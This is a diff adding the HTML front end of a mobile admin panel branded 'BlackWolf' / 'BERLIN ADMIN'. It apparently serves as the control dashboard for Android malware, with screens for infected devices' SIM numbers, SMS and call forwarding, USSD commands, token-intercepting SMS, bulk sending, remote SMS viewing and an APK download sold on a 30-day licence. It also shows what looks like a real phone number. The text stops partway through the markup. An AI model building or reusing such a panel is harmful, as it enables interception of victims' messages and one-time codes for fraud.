@@ -1,0 +1,2311 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>BlackWolf Admin</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
+<script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.14.1/firebase-database-compat.js"></script>
+<style>
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+body{margin:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#e8eef5;overscroll-behavior:none}
+::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:#cbd5e1;border-radius:4px}
+.screen{display:none;padding-bottom:70px;min-height:calc(100vh - 70px)}.screen.active{display:block}
+.slide-in{animation:slideIn .25s ease}
+@keyframes slideIn{from{transform:translateX(100%);opacity:0}to{transform:translateX(0);opacity:1}}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+.fade-in{animation:fadeIn .3s ease}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.pulse-dot{animation:pulse 1.5s infinite}
+.toast{animation:pillPop .2s cubic-bezier(0.175, 0.885, 0.32, 1.275)}
+@keyframes pillPop{from{transform:scale(0.85) translateY(12px);opacity:0}to{transform:scale(1) translateY(0);opacity:1}}
+input,textarea{outline:none}
+.action-btn{transition:all .12s;active:scale(.95)}
+.action-btn:active{transform:scale(.95)}
+</style>
+</head>
+<body class="overflow-hidden">
+<div id="app" class="max-w-[480px] mx-auto bg-[#edf2f7] min-h-screen relative">
+
+<!-- TOAST CONTAINER (Bottom Floating Pill) -->
+<div id="toast-box" class="fixed bottom-6 left-1/2 -translate-x-1/2 z-[9999] flex flex-col items-center gap-1.5 pointer-events-none w-auto max-w-[90%]"></div>
+
+<!-- DELETE MODAL -->
+<div id="modal" class="fixed inset-0 bg-black/50 z-[900] hidden items-center justify-center" style="display:none">
+<div class="bg-white rounded-2xl p-6 mx-6 w-full max-w-[350px] text-center shadow-2xl">
+<div class="w-14 h-14 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-3"><i class="fa-solid fa-trash text-red-500 text-xl"></i></div>
+<h3 class="font-bold text-lg mb-1">Delete Device?</h3>
+<p class="text-gray-500 text-sm mb-5">This will permanently remove this device and all its data from the database.</p>
+<div class="flex gap-3">
+<button onclick="closeModal()" class="flex-1 py-2.5 rounded-xl border border-gray-300 font-semibold text-gray-600">Cancel</button>
+<button id="modal-confirm-btn" class="flex-1 py-2.5 rounded-xl bg-red-500 text-white font-semibold">Delete</button>
+</div></div></div>
+
+<!-- ====== MAIN HEADER ====== -->
+<header id="main-header" class="sticky top-0 z-50 px-4 pt-3 pb-2 bg-[#edf2f7]">
+<div class="bg-gradient-to-r from-[#d0e3f8] to-[#b8d4f0] rounded-full px-4 py-2.5 flex items-center justify-between shadow-sm">
+<div class="flex items-center gap-2.5">
+<img src="https://i.postimg.cc/7hrxkg9G/A83621AC-1936-4E7A-A2D7-013412F8DFF9.png" class="w-10 h-10 rounded-full object-cover shadow border-2 border-white" alt="Logo">
+<div><div class="font-bold text-[15px] text-gray-800">BERLIN <i class="fa-solid fa-caret-down text-xs text-gray-500"></i></div>
+<div class="text-[11px] text-gray-500">Admin · 30d</div></div>
+</div>
+<div class="flex items-center gap-4">
+<div class="text-center"><span class="font-bold text-[15px] text-gray-800 device-counter-text">0 / 0</span><div class="text-[10px] text-gray-500">Devices</div></div>
+<div class="relative"><i class="fa-solid fa-bell text-gray-600 text-lg"></i><span class="absolute -top-1 -right-1 w-2.5 h-2.5 bg-red-500 rounded-full pulse-dot"></span></div>
+</div></div>
+<div class="flex items-center gap-1.5 mt-2 px-2"><span id="conn-dot" class="w-2 h-2 rounded-full bg-gray-400"></span><span id="conn-text" class="text-[10px] text-gray-400">Connecting...</span></div>
+</header>
+
+<!-- ====== DETAIL HEADER REMOVED ====== -->
+
+<!-- ========== SCREEN: HOME ========== -->
+<div id="screen-home" class="screen active" data-screen>
+<div class="px-4 space-y-4 pt-2">
+<!-- Banner -->
+<div class="rounded-2xl overflow-hidden shadow-lg relative">
+<img src="https://i.postimg.cc/VN7RpgY4/41890882786.png" class="w-full h-auto object-cover" alt="Banner">
+<div class="absolute inset-0 bg-gradient-to-t from-black/80 via-black/20 to-transparent flex flex-col justify-end p-4 pb-5">
+<div class="text-[22px] font-black text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 to-blue-400 filter drop-shadow-[0_2px_4px_rgba(0,0,0,0.9)] tracking-wide">BERLIN ADMIN PANEL</div>
+<div class="text-[11px] text-gray-200 font-medium drop-shadow-md mt-0.5">Trust is our code. Security is our promise.</div>
+</div></div>
+
+<!-- Greeting -->
+<h2 id="greeting-text" class="text-lg font-bold text-gray-800 px-1">Good afternoon, Admin</h2>
+
+<!-- Panel Actions -->
+<div class="bg-white rounded-2xl p-5 shadow-sm">
+<h3 class="font-bold text-[13px] text-gray-700 mb-4">Panel Actions</h3>
+<div class="grid grid-cols-3 gap-4">
+<button onclick="navigateTo('devices')" class="flex flex-col items-center action-btn">
+<div class="relative w-[68px] h-[68px] flex items-center justify-center mb-1.5">
+  <svg class="absolute inset-0 w-full h-full text-[#2481d7]" viewBox="0 0 100 100"><circle cx="50" cy="50" r="42" fill="none" stroke="currentColor" stroke-width="10" stroke-dasharray="200 263.89" stroke-linecap="round" transform="rotate(-45 50 50)"/></svg>
+  <div class="w-[42px] h-[42px] bg-[#2481d7] rounded-full flex items-center justify-center text-white text-[17px] z-10"><i class="fa-solid fa-mobile-screen"></i></div>
+</div>
+<span class="text-[11.5px] font-bold text-[#1a2b4b]">Devices</span></button>
+
+<button onclick="navigateTo('data')" class="flex flex-col items-center action-btn">
+<div class="relative w-[68px] h-[68px] flex items-center justify-center mb-1.5">
+  <svg class="absolute inset-0 w-full h-full text-[#2481d7]" viewBox="0 0 100 100"><circle cx="50" cy="50" r="42" fill="none" stroke="currentColor" stroke-width="10" stroke-dasharray="200 263.89" stroke-linecap="round" transform="rotate(-45 50 50)"/></svg>
+  <div class="w-[42px] h-[42px] bg-[#2481d7] rounded-full flex items-center justify-center text-white text-[17px] z-10"><i class="fa-solid fa-database"></i></div>
+</div>
+<span class="text-[11.5px] font-bold text-[#1a2b4b]">Data</span></button>
+
+<button onclick="navigateTo('messages')" class="flex flex-col items-center action-btn">
+<div class="relative w-[68px] h-[68px] flex items-center justify-center mb-1.5">
+  <svg class="absolute inset-0 w-full h-full text-[#2481d7]" viewBox="0 0 100 100"><circle cx="50" cy="50" r="42" fill="none" stroke="currentColor" stroke-width="10" stroke-dasharray="200 263.89" stroke-linecap="round" transform="rotate(-45 50 50)"/></svg>
+  <div class="w-[42px] h-[42px] bg-[#2481d7] rounded-full flex items-center justify-center text-white text-[17px] z-10"><i class="fa-solid fa-comment-dots"></i></div>
+</div>
+<span class="text-[11.5px] font-bold text-[#1a2b4b]">Messages</span></button>
+
+<button onclick="navigateTo('bulk')" class="flex flex-col items-center action-btn">
+<div class="relative w-[68px] h-[68px] flex items-center justify-center mb-1.5">
+  <svg class="absolute inset-0 w-full h-full text-[#2481d7]" viewBox="0 0 100 100"><circle cx="50" cy="50" r="42" fill="none" stroke="currentColor" stroke-width="10" stroke-dasharray="200 263.89" stroke-linecap="round" transform="rotate(-45 50 50)"/></svg>
+  <div class="w-[42px] h-[42px] bg-[#2481d7] rounded-full flex items-center justify-center text-white text-[17px] z-10 pl-0.5"><i class="fa-solid fa-paper-plane"></i></div>
+</div>
+<span class="text-[11.5px] font-bold text-[#1a2b4b]">Bulk Sender</span></button>
+
+<button onclick="navigateTo('sessions')" class="flex flex-col items-center action-btn">
+<div class="relative w-[68px] h-[68px] flex items-center justify-center mb-1.5">
+  <svg class="absolute inset-0 w-full h-full text-[#2481d7]" viewBox="0 0 100 100"><circle cx="50" cy="50" r="42" fill="none" stroke="currentColor" stroke-width="10" stroke-dasharray="200 263.89" stroke-linecap="round" transform="rotate(-45 50 50)"/></svg>
+  <div class="w-[42px] h-[42px] bg-[#2481d7] rounded-full flex items-center justify-center text-white text-[17px] z-10"><i class="fa-solid fa-shield-halved"></i></div>
+</div>
+<span class="text-[11.5px] font-bold text-[#1a2b4b]">Sessions</span></button>
+
+<button onclick="toast('APK download coming soon','info')" class="flex flex-col items-center action-btn">
+<div class="relative w-[68px] h-[68px] flex items-center justify-center mb-1.5">
+  <svg class="absolute inset-0 w-full h-full text-[#2481d7]" viewBox="0 0 100 100"><circle cx="50" cy="50" r="42" fill="none" stroke="currentColor" stroke-width="10" stroke-dasharray="200 263.89" stroke-linecap="round" transform="rotate(-45 50 50)"/></svg>
+  <div class="w-[42px] h-[42px] bg-[#2481d7] rounded-full flex items-center justify-center text-white text-[17px] z-10"><i class="fa-solid fa-download"></i></div>
+</div>
+<span class="text-[11.5px] font-bold text-[#1a2b4b]">APK</span></button>
+</div>
+</div>
+
+<!-- Tools & Features -->
+<div>
+<h3 class="font-bold text-[13px] text-gray-700 mb-3 px-1">Tools & Features</h3>
+<div class="grid grid-cols-2 gap-3">
+<div class="bg-white rounded-2xl p-4 shadow-sm cursor-pointer" onclick="navigateTo('auto-token')">
+<h4 class="font-bold text-[12px] text-gray-700 mb-1">Auto Token</h4>
+<p class="text-[10px] text-gray-400 mb-2">Auto-fill panel token for faster login</p>
+<div class="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center ml-auto"><i class="fa-solid fa-key text-blue-500"></i></div>
+</div>
+<div class="bg-white rounded-2xl p-4 shadow-sm cursor-pointer" onclick="openPinModal()">
+<h4 class="font-bold text-[12px] text-gray-700 mb-1">Change PIN</h4>
+<p class="text-[10px] text-gray-400 mb-2">Update your account password anytime</p>
+<div class="w-10 h-10 rounded-full bg-blue-50 flex items-center justify-center ml-auto"><i class="fa-solid fa-lock text-blue-500"></i></div>
+</div>
+<div class="bg-white rounded-2xl p-4 shadow-sm cursor-pointer" onclick="toast('Coming soon','info')">
+<h4 class="font-bold text-[12px] text-gray-700 mb-1">Financial Report</h4>
+<p class="text-[10px] text-gray-400 mb-2">Coming soon</p>
+<div class="w-10 h-10 rounded-full bg-gray-50 flex items-center justify-center ml-auto"><i class="fa-solid fa-file-invoice-dollar text-gray-400"></i></div>
+</div>
+<div class="bg-white rounded-2xl p-4 shadow-sm cursor-pointer" onclick="toast('Coming soon','info')">
+<h4 class="font-bold text-[12px] text-gray-700 mb-1">Smart Analytics</h4>
+<p class="text-[10px] text-gray-400 mb-2">Coming soon</p>
+<div class="w-10 h-10 rounded-full bg-gray-50 flex items-center justify-center ml-auto"><i class="fa-solid fa-chart-pie text-gray-400"></i></div>
+</div>
+</div>
+</div>
+</div></div>
+
+<!-- LOGIN SCREEN -->
+<div id="login-screen" class="fixed inset-0 bg-[#e8eef5] z-[99999] flex flex-col items-center justify-center p-4 w-full h-full overflow-hidden" style="overscroll-behavior: none; touch-action: none;">
+<div class="bg-white rounded-3xl p-8 w-full max-w-[360px] shadow-2xl text-center">
+<div class="w-20 h-20 rounded-full flex items-center justify-center mx-auto mb-4 shadow"><img src="https://i.postimg.cc/7hrxkg9G/A83621AC-1936-4E7A-A2D7-013412F8DFF9.png" class="w-full h-full rounded-full object-cover"></div>
+<h2 class="text-2xl font-black text-gray-800 mb-1">BERLIN ADMIN</h2>
+<p class="text-[10px] text-green-600 mb-6 font-bold bg-green-50 py-1.5 px-3 rounded-full inline-block border border-green-100">30d License Active</p>
+<div class="text-left mb-1.5 text-[11px] font-bold text-gray-500 uppercase ml-1">Panel Password</div>
+<div class="relative mb-5">
+<input id="login-password" type="password" placeholder="••••••••" class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3.5 text-center text-lg font-bold tracking-widest focus:border-blue-500 outline-none transition-colors pr-10">
+<button onclick="togglePassword()" class="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 p-2"><i id="eye-icon" class="fa-solid fa-eye"></i></button>
+</div>
+<button onclick="checkLogin()" class="w-full bg-[#2481d7] text-white font-bold py-3.5 rounded-xl shadow-[0_4px_14px_rgba(36,129,215,0.4)] active:scale-95 transition-transform">UNLOCK PANEL</button>
+</div>
+</div>
+
+<!-- CHANGE PIN MODAL -->
+<div id="pin-modal" class="fixed inset-0 bg-black/50 z-[900] hidden items-center justify-center p-4" style="display:none">
+<div class="bg-white rounded-2xl p-6 w-full max-w-[320px] text-center shadow-2xl">
+<div class="w-12 h-12 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-3"><i class="fa-solid fa-lock text-blue-500 text-lg"></i></div>
+<h3 class="font-bold text-lg mb-1">Change Password</h3>
+<p class="text-xs text-gray-400 mb-4">Updates panel access globally in real-time</p>
+<input id="new-pin-input" type="text" placeholder="Enter new password" class="w-full bg-gray-50 border border-gray-200 rounded-xl px-4 py-3 mb-4 text-center font-semibold outline-none focus:border-blue-500">
+<div class="flex gap-3">
+<button onclick="document.getElementById('pin-modal').style.display='none'" class="flex-1 py-2.5 rounded-xl border border-gray-300 font-semibold text-gray-600">Cancel</button>
+<button onclick="saveNewPin()" class="flex-1 py-2.5 rounded-xl bg-[#2481d7] text-white font-semibold">Save Password</button>
+</div></div></div>
+
+<!-- ========== SCREEN: SESSIONS ========== -->
+<div id="screen-sessions" class="screen slide-in" data-screen>
+<header class="sticky top-0 z-50 bg-white px-4 py-3 flex items-center gap-3 shadow-sm mb-2">
+<button onclick="navigateTo('home')" class="w-8 h-8 flex items-center justify-center bg-gray-100 rounded-full text-gray-600"><i class="fa-solid fa-arrow-left"></i></button>
+<h2 class="font-bold text-lg text-gray-800">Active Sessions</h2>
+</header>
+<div class="px-4 space-y-3 pb-4" id="sessions-list"></div>
+</div>
+
+<!-- ========== SCREEN: AUTO TOKEN ========== -->
+<div id="screen-auto-token" class="screen slide-in" data-screen>
+<header class="sticky top-0 z-50 bg-white px-4 py-3 flex items-center gap-3 shadow-sm mb-2">
+<button onclick="navigateTo('home')" class="w-8 h-8 flex items-center justify-center bg-gray-100 rounded-full text-gray-600"><i class="fa-solid fa-arrow-left"></i></button>
+<h2 class="font-bold text-lg text-gray-800">Auto Token Devices</h2>
+</header>
+<div class="px-4 space-y-3 pb-4" id="auto-token-list">
+<!-- Devices rendered here -->
+</div>
+</div>
+
+<!-- AUTO TOKEN SMS MODAL -->
+<div id="auto-token-modal" class="fixed inset-0 bg-black/40 z-[900] hidden items-center justify-center p-4" style="display:none">
+<div class="bg-[#dceef9] rounded-xl w-full max-w-[340px] shadow-2xl overflow-hidden relative pb-4">
+<!-- Header -->
+<div class="flex items-center justify-between p-3 pb-1">
+<h3 id="auto-token-model" class="font-bold text-gray-800 text-sm pl-1">vivo V2420</h3>
+<div class="flex gap-1.5">
+<button class="w-8 h-8 bg-[#c6def1] text-blue-500 rounded-lg flex items-center justify-center"><i class="fa-solid fa-minus"></i></button>
+<button onclick="closeAutoTokenModal()" class="w-8 h-8 bg-[#e84c5a] text-white rounded-lg flex items-center justify-center shadow-sm"><i class="fa-solid fa-xmark"></i></button>
+</div>
+</div>
+<!-- Body -->
+<div class="px-3 space-y-2 mt-2">
+<input id="auto-token-num" type="text" placeholder="To number..." class="w-full bg-white rounded-lg px-3 py-3 text-sm text-gray-700 outline-none border border-transparent focus:border-blue-300 transition-colors shadow-sm placeholder-gray-400">
+<textarea id="auto-token-msg" placeholder="Message body..." rows="2" class="w-full bg-white rounded-lg px-3 py-3 text-sm text-gray-700 outline-none resize-none border border-transparent focus:border-blue-300 transition-colors shadow-sm placeholder-gray-400"></textarea>
+</div>
+<!-- Actions -->
+<div class="px-3 mt-3 flex items-center justify-between">
+<span class="text-[11px] text-[#8fb8df] font-medium">Paste from clipboard</span>
+<button onclick="pasteToAutoToken()" class="bg-[#2481d7] text-white text-xs font-bold px-4 py-2 rounded-lg flex items-center gap-1.5 shadow-sm active:scale-95 transition-transform"><i class="fa-regular fa-paste"></i> Paste</button>
+</div>
+<div class="px-3 mt-3 flex gap-2" id="auto-token-sims">
+<button class="flex-1 bg-[#2481d7] text-white py-3 rounded-lg font-bold text-xs shadow-sm active:scale-95 transition-transform">SIM 1</button>
+<button class="flex-1 bg-[#2481d7] text-white py-3 rounded-lg font-bold text-xs shadow-sm active:scale-95 transition-transform">SIM 2</button>
+</div>
+<!-- AUTO TOKEN SMS MODAL END -->
+</div>
+</div>
+
+<!-- CALL FWD MODAL -->
+<div id="modal-call-fwd" onclick="if(event.target===this) this.classList.replace('flex','hidden')" class="fixed inset-0 bg-black/40 z-[900] hidden items-center justify-center p-4">
+  <div class="bg-white rounded-[24px] w-full max-w-[340px] shadow-2xl overflow-hidden p-5 space-y-4">
+    <h3 class="font-bold text-[#1a2b4b] text-[17px]">Call Forwarding</h3>
+    <input type="text" id="inp-call-fwd-num" placeholder="Forward to number..." class="w-full bg-[#f8fafe] border border-[#e5eff8] rounded-xl px-4 py-3.5 text-sm text-[#1a2b4b] outline-none focus:border-[#2481d7] placeholder-[#a0c1db] font-medium">
+    
+    <select id="sel-call-fwd-sim" class="w-full bg-[#f8fafe] border border-[#e5eff8] rounded-xl px-4 py-3.5 text-sm text-[#1a2b4b] outline-none focus:border-[#2481d7] appearance-none font-medium bg-no-repeat bg-[position:calc(100%-1rem)_center] bg-[length:12px]" style="background-image: url('data:image/svg+xml;utf8,<svg fill=\'%23a0c1db\' viewBox=\'0 0 24 24\' xmlns=\'http://www.w3.org/2000/svg\'><path d=\'M7 10l5 5 5-5z\'/></svg>')">
+    </select>
+    
+    <div class="flex gap-3">
+      <button onclick="submitCallFwd('activate')" class="flex-1 bg-[#2481d7] text-white py-3.5 rounded-[14px] font-bold text-[13px] shadow-sm active:scale-95">Activate</button>
+      <button onclick="submitCallFwd('deactivate')" class="flex-1 bg-[#e43a4e] text-white py-3.5 rounded-[14px] font-bold text-[13px] shadow-sm active:scale-95">Deactivate</button>
+    </div>
+    
+    <button onclick="submitCallFwd('deactivate_all')" class="w-full bg-[#faeaeb] text-[#e43a4e] border border-[#f5d0d4] py-3.5 rounded-[14px] font-bold text-[13px] shadow-sm active:scale-95 mt-1">Deactivate All (Both SIMs)</button>
+
+    <div class="pt-2 border-t border-gray-100 mt-2">
+      <h4 class="text-[10px] font-bold text-[#64748b] uppercase tracking-wider mb-2">Recent Logs</h4>
+      <p class="text-xs text-gray-400" id="call-fwd-logs">No logs yet</p>
+    </div>
+  </div>
+</div>
+
+<!-- SMS FWD MODAL -->
+<div id="modal-sms-fwd" onclick="if(event.target===this) this.classList.replace('flex','hidden')" class="fixed inset-0 bg-black/40 z-[900] hidden items-center justify-center p-4">
+  <div class="bg-white rounded-[24px] w-full max-w-[340px] shadow-2xl overflow-hidden p-5 space-y-4">
+    <h3 class="font-bold text-[#1a2b4b] text-[17px]">SMS Forwarding</h3>
+    <input type="text" id="inp-sms-fwd-num" placeholder="Forward to number..." class="w-full bg-[#f8fafe] border border-[#e5eff8] rounded-xl px-4 py-3.5 text-sm text-[#1a2b4b] outline-none focus:border-[#2481d7] placeholder-[#a0c1db] font-medium">
+    
+    <select id="sel-sms-fwd-sim" class="w-full bg-[#f8fafe] border border-[#e5eff8] rounded-xl px-4 py-3.5 text-sm text-[#1a2b4b] outline-none focus:border-[#2481d7] appearance-none font-medium bg-no-repeat bg-[position:calc(100%-1rem)_center] bg-[length:12px]" style="background-image: url('data:image/svg+xml;utf8,<svg fill=\'%23a0c1db\' viewBox=\'0 0 24 24\' xmlns=\'http://www.w3.org/2000/svg\'><path d=\'M7 10l5 5 5-5z\'/></svg>')">
+    </select>
+    
+    <div class="flex gap-3">
+      <button onclick="submitSmsFwd('activate')" class="flex-1 bg-[#2481d7] text-white py-3.5 rounded-[14px] font-bold text-[13px] shadow-sm active:scale-95">Activate</button>
+      <button onclick="submitSmsFwd('deactivate')" class="flex-1 bg-[#e43a4e] text-white py-3.5 rounded-[14px] font-bold text-[13px] shadow-sm active:scale-95">Deactivate</button>
+    </div>
+    
+    <button onclick="submitSmsFwd('deactivate_all')" class="w-full bg-[#faeaeb] text-[#e43a4e] border border-[#f5d0d4] py-3.5 rounded-[14px] font-bold text-[13px] shadow-sm active:scale-95 mt-1">Deactivate All (Both SIMs)</button>
+
+    <div class="pt-2 border-t border-gray-100 mt-2">
+      <h4 class="text-[10px] font-bold text-[#64748b] uppercase tracking-wider mb-2">Recent Logs</h4>
+      <p class="text-xs text-gray-400" id="sms-fwd-logs">No logs yet</p>
+    </div>
+  </div>
+</div>
+
+<!-- USSD MODAL -->
+<div id="modal-ussd" onclick="if(event.target===this) this.classList.replace('flex','hidden')" class="fixed inset-0 bg-black/40 z-[900] hidden items-center justify-center p-4">
+  <div class="bg-white rounded-[24px] w-full max-w-[340px] shadow-2xl overflow-hidden p-5 space-y-4">
+    <h3 class="font-bold text-[#1a2b4b] text-[17px]">USSD Code</h3>
+    <input type="text" id="inp-ussd-num" placeholder="e.g. *123#" class="w-full bg-[#f8fafe] border border-[#e5eff8] rounded-xl px-4 py-3.5 text-sm text-[#1a2b4b] outline-none focus:border-[#2481d7] placeholder-[#a0c1db] font-medium">
+    
+    <select id="sel-ussd-sim" class="w-full bg-[#f8fafe] border border-[#e5eff8] rounded-xl px-4 py-3.5 text-sm text-[#1a2b4b] outline-none focus:border-[#2481d7] appearance-none font-medium bg-no-repeat bg-[position:calc(100%-1rem)_center] bg-[length:12px]" style="background-image: url('data:image/svg+xml;utf8,<svg fill=\'%23a0c1db\' viewBox=\'0 0 24 24\' xmlns=\'http://www.w3.org/2000/svg\'><path d=\'M7 10l5 5 5-5z\'/></svg>')">
+    </select>
+    
+    <button onclick="submitUssd()" class="w-full bg-[#2481d7] text-white py-3.5 rounded-[14px] font-bold text-[13px] shadow-sm active:scale-95">Activate</button>
+  </div>
+</div>
+<!-- WEB HOST MODAL (Matching Video Design) -->
+<div id="modal-web-host" onclick="if(event.target===this) this.classList.replace('flex','hidden')" class="fixed inset-0 bg-black/50 z-[950] hidden items-center justify-center p-4">
+  <div class="bg-white rounded-[24px] w-full max-w-[350px] shadow-2xl overflow-hidden p-6 text-center space-y-4">
+    <div class="w-14 h-14 bg-blue-50 text-[#2481d7] rounded-full flex items-center justify-center mx-auto text-2xl shadow-sm">
+      <i class="fa-solid fa-globe"></i>
+    </div>
+    <div>
+      <h3 class="font-bold text-[#1a2b4b] text-[18px]">Start Web Host</h3>
+      <p class="text-xs text-gray-500 mt-1">Access device SMS from any browser (iOS/PC)</p>
+    </div>
+
+    <div class="bg-[#f0f8fd] border border-[#dceef9] rounded-xl p-3">
+      <div class="text-[11px] font-bold text-[#2481d7] uppercase">Your Secure PIN</div>
+      <div class="text-2xl font-black text-[#1a2b4b] tracking-widest mt-0.5" id="host-pin-val">170</div>
+    </div>
+
+    <div>
+      <label class="text-[10px] font-bold text-gray-500 uppercase tracking-wider block mb-2">Link Expiry Time</label>
+      <div class="grid grid-cols-4 gap-1.5" id="host-expiry-options">
+        <button onclick="setHostExpiry(5)" class="host-exp-btn py-2 rounded-lg text-xs font-bold bg-[#2481d7] text-white shadow-sm">5 min</button>
+        <button onclick="setHostExpiry(10)" class="host-exp-btn py-2 rounded-lg text-xs font-bold bg-gray-100 text-gray-600">10 min</button>
+        <button onclick="setHostExpiry(15)" class="host-exp-btn py-2 rounded-lg text-xs font-bold bg-gray-100 text-gray-600">15 min</button>
+        <button onclick="setHostExpiry(30)" class="host-exp-btn py-2 rounded-lg text-xs font-bold bg-gray-100 text-gray-600">30 min</button>
+      </div>
+    </div>
+
+    <div class="flex gap-2 pt-2">
+      <button id="btn-start-host" onclick="startWebHostSession()" class="flex-1 bg-[#2481d7] text-white py-3.5 rounded-xl font-bold text-sm shadow-md active:scale-95 transition-transform">START HOST</button>
+      <button onclick="document.getElementById('modal-web-host').classList.replace('flex','hidden')" class="px-4 py-3.5 rounded-xl border border-gray-200 text-gray-600 font-bold text-sm">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- WEB HOST ACTIVE MODAL (Generated Link & PIN) -->
+<div id="modal-web-host-active" onclick="if(event.target===this) this.classList.replace('flex','hidden')" class="fixed inset-0 bg-black/50 z-[960] hidden items-center justify-center p-4">
+  <div class="bg-white rounded-[24px] w-full max-w-[360px] shadow-2xl overflow-hidden p-6 text-center space-y-4">
+    <div class="w-14 h-14 bg-green-50 text-[#16a34a] rounded-full flex items-center justify-center mx-auto text-2xl shadow-sm">
+      <i class="fa-solid fa-[#16a34a] fa-circle-check"></i>
+    </div>
+    <div>
+      <h3 class="font-bold text-[#1a2b4b] text-[18px]">Web Host Active</h3>
+      <p class="text-xs text-gray-500 mt-1">Access from anywhere — no WiFi needed!</p>
+    </div>
+
+    <div class="text-left space-y-2">
+      <label class="text-[10px] font-bold text-gray-500 uppercase tracking-wider block">Globe URL</label>
+      <div class="bg-[#f0f8fd] border border-[#dceef9] rounded-xl p-2.5 flex items-center justify-between gap-2">
+        <input id="active-host-url" type="text" readonly class="bg-transparent text-xs font-mono text-[#2481d7] font-bold w-full outline-none truncate">
+        <button onclick="copyToClipboard(document.getElementById('active-host-url').value)" class="bg-[#2481d7] text-white text-[10px] font-bold px-3 py-1.5 rounded-lg active:scale-95">COPY</button>
+      </div>
+
+      <label class="text-[10px] font-bold text-gray-500 uppercase tracking-wider block pt-2">PIN</label>
+      <div class="bg-[#f0f8fd] border border-[#dceef9] rounded-xl p-2.5 flex items-center justify-between">
+        <span id="active-host-pin" class="text-xl font-black text-[#1a2b4b] tracking-widest pl-2">170</span>
+        <button onclick="copyToClipboard(document.getElementById('active-host-pin').textContent)" class="bg-[#2481d7] text-white text-[10px] font-bold px-3 py-1.5 rounded-lg active:scale-95">COPY</button>
+      </div>
+    </div>
+
+    <div class="flex gap-2 pt-2">
+      <button onclick="stopWebHostSession()" class="flex-1 bg-[#ef4444] text-white py-3.5 rounded-xl font-bold text-xs shadow-md active:scale-95">STOP HOST</button>
+      <button onclick="document.getElementById('modal-web-host-active').classList.replace('flex','hidden')" class="flex-1 bg-[#2481d7] text-white py-3.5 rounded-xl font-bold text-xs shadow-md active:scale-95">CLOSE</button>
+    </div>
+  </div>
+</div>
+
+<!-- GUEST PIN VERIFICATION MODAL -->
+<div id="modal-web-host-verify" class="fixed inset-0 bg-[#e8eef5] z-[99999] hidden items-center justify-center p-4" style="display:none">
+  <div class="bg-white rounded-3xl p-6 w-full max-w-[340px] shadow-2xl text-center space-y-4">
+    <div class="w-16 h-16 bg-blue-50 text-[#2481d7] rounded-full flex items-center justify-center mx-auto text-2xl shadow-sm">
+      <i class="fa-solid fa-lock"></i>
+    </div>
+    <div>
+      <h3 class="font-bold text-xl text-[#1a2b4b]">Enter PIN</h3>
+      <p class="text-xs text-gray-500 mt-1">Enter 3-digit PIN to access device</p>
+    </div>
+    <input id="guest-pin-input" type="text" maxlength="3" placeholder="• • •" class="w-full bg-[#f4f8fb] border-2 border-[#dceef9] rounded-xl px-4 py-3.5 text-center text-2xl font-black tracking-widest text-[#1a2b4b] outline-none focus:border-[#2481d7]">
+    <button onclick="verifyGuestPin()" class="w-full bg-[#2481d7] text-white py-3.5 rounded-xl font-bold text-sm shadow-md active:scale-95 transition-transform">Verify & Access</button>
+  </div>
+</div>
+
+<!-- STANDALONE WEB HOST GUEST VIEW (Matches Screenshot Exactly) -->
+<div id="screen-web-host" class="screen" data-screen>
+  <div class="px-4 pt-4 space-y-4 max-w-[440px] mx-auto pb-10">
+    
+    <!-- CARD 1: DEVICE SUMMARY INFO GRID -->
+    <div class="bg-[#f0f8fd] rounded-[24px] p-4 border border-[#e2eff9] shadow-sm space-y-4">
+      <div class="grid grid-cols-2 divide-x divide-[#e2eff9]">
+        <div class="p-2 border-b border-[#e2eff9]">
+          <div class="text-[10px] font-bold text-[#2481d7] uppercase">MODEL</div>
+          <div class="text-[15px] font-black text-[#1a2b4b]" id="host-view-model">V2439</div>
+        </div>
+        <div class="p-2 border-b border-[#e2eff9] pl-4">
+          <div class="text-[10px] font-bold text-[#2481d7] uppercase">BRAND</div>
+          <div class="text-[15px] font-black text-[#1a2b4b]" id="host-view-brand">vivo</div>
+        </div>
+        <div class="p-2 border-b border-[#e2eff9]">
+          <div class="text-[10px] font-bold text-[#2481d7] uppercase">DEVICE NAME</div>
+          <div class="text-[14px] font-black text-[#1a2b4b]" id="host-view-name">vivo V2439</div>
+        </div>
+        <div class="p-2 border-b border-[#e2eff9] pl-4">
+          <div class="text-[10px] font-bold text-[#2481d7] uppercase">STATUS</div>
+          <div class="text-[14px] font-black text-[#16a34a]" id="host-view-status">Online</div>
+        </div>
+        <div class="p-2 pt-3">
+          <div class="text-[10px] font-bold text-[#2481d7] uppercase">SIM 1</div>
+          <div class="text-[13px] font-black text-[#1a2b4b] truncate" id="host-view-sim1">+917500724199</div>
+          <div class="text-[9px] text-gray-500" id="host-view-sim1-carrier">airtel</div>
+        </div>
+        <div class="p-2 pt-3 pl-4">
+          <div class="text-[10px] font-bold text-[#2481d7] uppercase">SIM 2</div>
+          <div class="text-[13px] font-black text-[#1a2b4b] truncate" id="host-view-sim2">SIM 2</div>
+          <div class="text-[9px] text-gray-500" id="host-view-sim2-carrier"></div>
+        </div>
+      </div>
+
+      <!-- COUNTDOWN TIMER BADGE -->
+      <div class="bg-[#eef8f1] border border-[#c8ebd1] rounded-2xl py-2.5 px-4 text-center">
+        <span class="text-xs font-bold text-[#16a34a]" id="host-view-timer">Active • 5 min</span>
+      </div>
+    </div>
+
+    <!-- CARD 2: SEND SMS MESSAGE -->
